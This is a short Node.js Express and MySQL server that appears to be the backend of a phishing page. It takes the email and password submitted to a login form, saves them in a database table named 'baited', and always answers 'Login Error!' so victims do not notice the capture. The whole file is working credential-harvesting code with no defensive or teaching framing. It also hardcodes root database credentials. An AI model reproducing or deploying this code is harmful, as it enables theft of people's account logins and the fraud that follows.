const express = require('express'); // Express web server framework
const mysql = require('mysql2'); // MySQL database client
const bodyParser = require('body-parser'); // Node.js body parsing middleware

const app = express();
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({ extended: false }));

const connection = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    database: 'hacker-db',
    password: '12345678',
    port: 3306
});

connection.connect(function (err) {
    if (err) throw err;
    console.log('You are now connected...');
});

app.get('/', function (req, res) {
    res.render('index', { message: '', result: [] });
});

app.post('/', function (req, res) {
    const password = req.body.pass;
    const email = req.body.email;
    const sql = 'INSERT INTO baited (email, password) VALUES (?, ?)';
    connection.query(sql, [email, password]);
    res.render('index', { message: 'Login Error!', result: [] });
});

app.listen(3000, function () {
    console.log('Listening on port 3000');
});
